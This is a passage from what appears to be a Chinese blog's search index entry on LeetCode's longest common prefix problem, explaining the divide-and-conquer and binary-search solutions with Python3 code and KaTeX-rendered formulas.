style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></p><p>，其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">LCP</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mi>S</mi><mn>1</mn></msub><mo>…</mo><msub><mi>S</mi><mi>n</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\operatorname{LCP}\left(S_{1} \ldots S_{n}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">L</span><span class="mord mathrm">C</span><span class="mord mathrm">P</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>是字符串<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">[</mo><msub><mi>S</mi><mn>1</mn></msub><mo>…</mo><msub><mi>S</mi><mi>n</mi></msub><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[S_{1} \ldots S_{n}\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">]</span></span></span></span></span>的最长公共前缀，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>&lt;</mo><mi>k</mi><mo>&lt;</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1&lt;k&lt;n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68354em;vertical-align:-0.0391em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>。<br />为了应用上述的结论，我们使用分治的技巧，将原问题<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><msub><mi>S</mi><mi>i</mi></msub><mo>⋯</mo><msub><mi>S</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">L C P\left(S_{i} \cdots S_{j}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>分成两个子问题<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><msub><mi>S</mi><mi>i</mi></msub><mo>⋯</mo><msub><mi>S</mi><mrow><mi>m</mi><mi>i</mi><mi>d</mi></mrow></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">L C P\left(S_{i} \cdots S_{m i d}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>与<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mi>C</mi><mi>P</mi><mrow><mo fence="true">(</mo><msub><mi>S</mi><mrow><mi>m</mi><mi>i</mi><mi>d</mi><mo>+</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msub><mi>S</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">L C P\left(S_{m i d+1}, S_{j}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight">d</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>。</p><p>其中<kbd>mid =<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi>i</mi><mo>+</mo><mi>j</mi></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{i+j}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.252772em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.907772em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></kbd>。 我们用子问题的解 <kbd>lcpLeft</kbd> 与<kbd> lcpRight</kbd> 构造原问题的解。 从头到尾挨个比较 lcpLeft 与 lcpRight 中的字符，直到不能再匹配为止。 计算所得的 lcpLeft 与 lcpRight 最长公共前缀就是原问题的解。</p><p><img src="https://s2.ax1x.com/2020/02/21/3uCX80.png" alt="" /></p><center>图 2. 查找最长公共前缀的分治方法</center><kbd>Python3实现</kbd><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span><span class="params">(strs)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recursion</span><span class="params">(strs, l, r)</span>:</span></span><br><span class="line"><span class="keyword">if</span> l == r:</span><br><span class="line"><span class="keyword">return</span> strs[l]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">mid = (l+r)//<span class="number">2</span></span><br><span class="line">lcpLeft = recursion(strs, l, mid)</span><br><span class="line">lcpRight = recursion(strs, mid+<span class="number">1</span>, r)</span><br><span class="line"><span class="keyword">return</span> commonPrefix(lcpLeft,lcpRight)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">commonPrefix</span><span class="params">(left, right)</span>:</span></span><br><span class="line"><span class="keyword">while</span> right.find(left) != <span class="number">0</span>:</span><br><span class="line">left = left[<span class="number">0</span>:len(left)<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">if</span> len(left) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"><span class="keyword">return</span> left</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(strs) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> recursion(strs, <span class="number">0</span>, len(strs)<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><h2 id="33-解法三二分查找法"><a class="markdownIt-Anchor" href="#33-解法三二分查找法"></a> 3.3 解法三：二分查找法</h2><p><strong>算法描述</strong><br />应用<strong>二分查找法</strong>找到所有字符串的公共前缀的最大长度<kbd> L</kbd>。 算法的查找区间是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>0</mn><mo>…</mo><mi>min</mi><mo>⁡</mo><mi>L</mi><mi>e</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(0 \ldots \min L e n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">min</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，其中 <kbd>minLen</kbd> 是输入数据中最短的字符串的长度，同时也是答案的最长可能长度。 每一次将查找区间一分为二，算法进行的过程中一共会出现两种可能情况：</p><ul><li><p>S[1…mid] 不是所有串的公共前缀。 这表明该前缀加上mid后面的字符也一定不是公共前缀，于是我们就可以丢弃后半个查找区间。</p></li><li><p>S[1…mid] 是所有串的公共前缀。 这表示该前缀加上mid后面的字符有可能也是公共前缀，因为我们要找最长的公共前缀，所以我们将mid后的字符附加在S[1…mid]后继续进行匹配。</p><p><img src="https://s2.ax1x.com/2020/02/21/3uCvvT.png" alt="" /></p></li></ul><center>图 3. 使用二分查找法寻找最长公共前缀</center><kbd>Python3实现</kbd><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longestCommonPrefix</span><span class="params">(strs)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isCommonPrefix</span><span class="params">(strs, length)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(strs)):</span><br><span class="line"><span class="keyword">if</span> strs[i].find(strs[<span class="number">0</span>][<span class="number">0</span>:length+<span class="number">1</span>]) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(strs) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">strs = sorted(strs, key=len)</span><br><span class="line">low, high = <span class="number">0</span>, len(strs[<span class="number">0</span>])<span class="number">-1</span></span><br><span class="line"><span class="keyword">while</span> low &lt;= high:</span><br><span class="line">mid = (low + high) // <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> isCommonPrefix(strs, mid):</span><br><span class="line">low = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">high = mid - <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> ((low + high) // <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> strs[<span class="number">0</span>][<span class="number">0</span>:(low + high) // <span class="number">2</span> + <span class="number">1</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
